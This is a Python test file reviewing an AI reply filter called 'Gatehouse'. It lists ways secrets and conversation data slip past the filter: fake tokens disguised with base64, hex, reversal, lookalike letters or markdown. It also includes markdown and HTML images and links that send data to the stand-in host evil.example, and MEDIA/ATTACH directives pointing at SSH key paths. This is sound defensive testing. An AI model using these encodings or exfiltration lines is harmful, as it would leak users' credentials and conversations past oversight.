"""Review 2026-11-17: what the Gatehouse reply filter (gatehouse/output.py) lets out.

Secret-shaped strings are built at runtime (fakes.fake_secret or split literals of well-known
documentation examples); none is a real credential.
"""
from __future__ import annotations

import base64
import unittest

from tests.review._review import known_open
from tests.unit import fakes
from hearthward_guard.common import config
from hearthward_guard.gatehouse import output

CFG = config.parse({}).gatehouse
GH = fakes.fake_secret("github")
OA = fakes.fake_secret("openai")
PW = "Tr0ub4dor" + "&3xyzzy!"                                   # 17 characters, not a real password
AWS_SECRET = "wJalrXUtnFEMI/K7MDENG/bPxRfiCY" + "EXAMPLEKEY"     # the AWS documentation example
HOST = "evil.example"                                           # reserved test domain
SSH = "/home/user/.ssh/id_rsa"


def run(text):
    new, notes = output.filter_reply(text, CFG)
    return (text if new is None else new), notes


class GateCase(unittest.TestCase):
    def assertWithheld(self, text, msg=""):
        new, notes = output.filter_reply(text, CFG)
        self.assertEqual(new, output.WITHHELD, f"{msg or 'secret'} was not withheld (notes={notes})")

    def assertGone(self, needle, text, msg=""):
        out, notes = run(text)
        self.assertNotIn(needle, out, f"{msg or needle!r} survived the filter (notes={notes}): {out[:120]!r}")


class TestControls(GateCase):
    def test_plain_secrets_are_withheld(self):
        self.assertWithheld("token: " + GH)
        self.assertWithheld("key: " + OA)
        self.assertWithheld("password: " + PW)
        self.assertWithheld("postgres://admin:" + "hunter2" + "@db.internal:5432/app")

    def test_plain_directives_and_images_are_removed(self):
        self.assertGone(SSH, "Here you go\nMEDIA:" + SSH)
        self.assertGone(SSH, "The key is at " + SSH + " on disk")
        self.assertGone(HOST, f"![x](https://{HOST}/a.png?d=data)")
        self.assertGone(HOST, f'<img src="https://{HOST}/a.png?d=data">')


SECRET_FORMATTING = [
    ("one_space_between_characters", lambda: "token: " + " ".join(GH)),
    ("dash_every_four_characters", lambda: "token: " + "-".join(GH[i:i + 4] for i in range(0, len(GH), 4))),
    ("split_over_two_lines", lambda: "part 1: " + GH[:20] + "\npart 2: " + GH[20:]),
    ("reversed", lambda: "reversed token: " + GH[::-1]),
    ("base64", lambda: "b64: " + base64.b64encode(GH.encode()).decode()),
    ("hex", lambda: "hex: " + GH.encode().hex()),
    ("markdown_bold_in_the_middle", lambda: "token: " + GH[:6] + "**" + GH[6:12] + "**" + GH[12:]),
    ("markdown_escaped_underscore", lambda: "token: " + GH.replace("_", "\\_")),
    ("markdown_escaped_hyphen", lambda: "key: " + OA.replace("-", "\\-")),
    ("non_breaking_hyphen", lambda: "key: " + OA.replace("-", "‑")),
    ("lookalike_first_letter", lambda: "token: " + "ɡ" + GH[1:]),
    ("empty_html_tag_in_the_middle", lambda: "token: " + GH[:10] + "<b></b>" + GH[10:]),
    ("percent_encoded", lambda: "u: " + "".join("%%%02X" % b for b in GH.encode())),
]

SECRET_SHAPES = [
    ("env_line_DB_PASSWORD", lambda: "DB_PASSWORD=" + PW),
    ("env_line_POSTGRES_PASSWORD", lambda: "POSTGRES_PASSWORD=" + PW),
    ("env_line_MY_API_KEY", lambda: "MY_API_KEY=" + "abcd1234efgh5678ijkl"),
    ("json_password_field", lambda: '{"password": "' + PW + '"}'),
    ("yaml_client_secret", lambda: "client_secret: " + "abcd1234efgh5678ijkl"),
    ("token_assignment", lambda: "token = " + "abcd1234efgh5678ijkl9012"),
    ("pwd_assignment", lambda: "pwd=" + PW),
    ("password_in_a_sentence", lambda: "The wifi password is " + PW),
    ("short_password", lambda: "password: " + "hunter2"),
    ("aws_secret_access_key", lambda: "AWS_SECRET_ACCESS_KEY=" + AWS_SECRET),
    ("redis_url_password_only", lambda: "redis://:" + "hunter2secret" + "@cache.internal:6379"),
    ("session_cookie", lambda: "Cookie: session=" + "abcdefghijklmnop1234qrstuvwx"),
    ("wallet_seed_phrase", lambda: "seed phrase: legal winner thank year wave sausage worth useful legal winner thank yellow"),
    ("hex_private_key", lambda: "private key 0x" + "4c0883a69102937d6231471b5dbb6204fe512961708279f3e2a8b1c4d5e6f7a8"),
    ("npm_token", lambda: "npm" + "_" + "a1B2c3D4e5F6g7H8i9" + "J0k1L2m3N4o5P6q7R8"),
]

LEAKS = [
    # (name, finding, needle that must not survive, text)
    ("media_relative_dot_slash", "M7", "secrets/key.pem", lambda: "MEDIA:./secrets/key.pem"),
    ("media_relative_parent", "M7", ".ssh/id_rsa", lambda: "MEDIA:../../.ssh/id_rsa"),
    ("media_bare_relative", "M7", "secrets/key.pem", lambda: "MEDIA:secrets/key.pem"),
    ("media_remote_url", "M7", HOST, lambda: f"MEDIA:https://{HOST}/c?d=the-data"),
    ("media_env_var_path", "M7", ".ssh/id_rsa", lambda: "MEDIA:$HOME/.ssh/id_rsa"),
    ("attach_directive", "M7", SSH, lambda: "ATTACH:" + SSH),
    ("path_right_after_cjk_text", "M7", SSH, lambda: "文件在" + SSH),
    ("path_right_after_colon", "M7", SSH, lambda: "see:" + SSH),
    ("path_after_unclosed_code_fence", "M7", SSH, lambda: "Sure!\n```\n" + SSH),
    ("path_after_stray_backtick", "M7", SSH, lambda: "the ` key. file: " + SSH + " and `ok`"),
    ("home_of_named_user", "M7", ".ssh/id_rsa", lambda: "~root/.ssh/id_rsa"),
    ("image_uppercase_scheme", "M7", HOST, lambda: f"![x](HTTPS://{HOST}/a.png?d=data)"),
    ("image_reference_style", "M7", HOST, lambda: f"![x][r]\n\n[r]: https://{HOST}/a.png?d=data"),
    ("image_alt_with_bracket", "M7", HOST, lambda: f"![a [b] c](https://{HOST}/a.png?d=data)"),
    ("image_alt_over_two_lines", "M7", HOST, lambda: f"![line one\nline two](https://{HOST}/a.png?d=data)"),
    ("image_escaped_slashes", "M7", HOST, lambda: f"![x](https:\\/\\/{HOST}/a.png?d=data)"),
    ("html_video_tag", "M7", HOST, lambda: f'<video src="https://{HOST}/a.mp4?d=data"></video>'),
    # recheck item 7: plain words in a query are no longer enough without the conversation they came
    # from (tests/review/test_review_recheck2.py passes it); encoded data in the query still is
    ("bare_link_with_data_in_query", "M7", HOST,
     lambda: f"see https://{HOST}/c?d=" + base64.urlsafe_b64encode(b"the conversation so far").decode()),
]


class TestSecretFormatting(GateCase):
    """H7: a secret the filter knows is not recognised once its characters are rearranged or decorated."""


class TestSecretShapes(GateCase):
    """H7: everyday secret formats that match no pattern at all."""


class TestLeaks(GateCase):
    """M7: attachment directives, paths and remote fetches that stay in the reply."""


def _withheld(name, build):
    def test(self):
        self.assertWithheld(build(), name.replace("_", " "))
    test.finding = "H7"
    return test


def _gone(name, finding, needle, build):
    def test(self):
        self.assertGone(needle, build(), name.replace("_", " "))
    test.finding = finding
    return test


for _n, _b in SECRET_FORMATTING:
    setattr(TestSecretFormatting, "test_H7_" + _n, _withheld(_n, _b))
for _n, _b in SECRET_SHAPES:
    setattr(TestSecretShapes, "test_H7_" + _n, _withheld(_n, _b))
for _n, _f, _needle, _b in LEAKS:
    setattr(TestLeaks, f"test_{_f}_{_n}", _gone(_n, _f, _needle, _b))


class TestSideEffects(GateCase):
    def test_L7_directive_line_keeps_its_non_latin_text(self):
        out, _notes = run("Привет MEDIA:/tmp/x.png пока")
        self.assertIn("Привет", out, "the whole line was replaced by its look-alike-folded copy")
        self.assertIn("пока", out)

    def test_M7_invisible_characters_left_in_replies(self):
        for name, text in (("U+206A", "a⁪b"), ("backspace and ANSI escape", "a\x08b\x1b[31mc"),
                           ("selector after a non-ASCII letter", "é︁é︊é︃")):
            with self.subTest(name=name):
                out, _notes = run(text)
                self.assertNotEqual(out, text, f"{name} passed through unchanged")


if __name__ == "__main__":
    unittest.main()
